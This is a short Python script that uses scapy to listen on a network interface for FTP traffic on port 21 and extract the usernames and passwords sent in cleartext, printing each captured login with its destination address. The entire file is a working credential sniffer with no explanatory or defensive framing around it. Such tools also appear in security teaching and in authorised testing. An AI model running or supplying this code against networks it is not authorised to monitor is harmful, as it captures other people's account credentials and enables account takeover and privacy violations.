import re
import argparse
from scapy.all import sniff, conf
from scapy.layers.inet import IP

def ftp_sniff(packet):
    dest = packet.getlayer(IP).dst
    raw = packet.sprintf('%Raw.load%')
    print(raw)
    user = re.findall(f'(?i)USER (.*)', raw)
    password = re.findall(f'(?i)PASS (.*)', raw)
    
    if user:
        print(f'[*] Detected FTP Login to {str(dest)}')
        print(f'[+] User account: {str(user[0])}')
    if password:
        print(f'[+] Password: {str(password[0])}')


if __name__ == '__main__':
    parser = argparse.ArgumentParser(usage='python3 ftp_sniff.py <interface>')
    parser.add_argument('interface', type=str, metavar='INTERFACE',
                        help='specify the interface to listen on')
    args = parser.parse_args()
    
    try:
        sniff(iface=args.interface,filter='tcp port 21', prn=ftp_sniff)
    except KeyboardInterrupt:
        exit(0)
